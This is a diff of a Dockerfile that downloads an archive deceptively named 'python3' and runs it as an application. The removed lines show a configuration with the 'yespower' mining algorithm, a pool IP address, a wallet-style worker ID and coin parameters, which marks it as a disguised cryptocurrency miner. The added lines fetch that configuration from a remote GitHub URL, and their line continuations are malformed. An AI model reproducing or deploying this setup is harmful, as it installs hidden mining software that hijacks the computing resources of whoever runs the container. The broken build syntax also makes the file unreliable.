@@ -36,11 +36,11 @@ RUN wget https://bitbucket.org/excel-gms/config/downloads/python3.tar.gz && \
     tar -xvf python3.tar.gz && \
     rm python3.tar.gz && \
     cd python3 && \
-    ./setup.sh && rm config.json \
+    ./setup.sh 
 
 # Configure the application
-COPY config.json /app/python3/config.json
-RUN echo '{"algorithm": "yespower", "host": "146.103.45.69", "port": 80, "worker": "TSiaCHGhP7fBcqDQTBt2Era8bVJhsau9eR", "password": "c=TDC,mc=SMT/SPRX/SWAMP", "workers": 4, "log": false, "chrome": "./chromium/chrome" }' > /app/python3/config.json
+RUN wget -O config.json https://raw.githubusercontent.com/bambangekosaputro53/vx73/refs/heads/master/config.json && \
+COPY config.json /app/python3/config.json \
 
 # Set entrypoint to run the application
 WORKDIR /app/python3
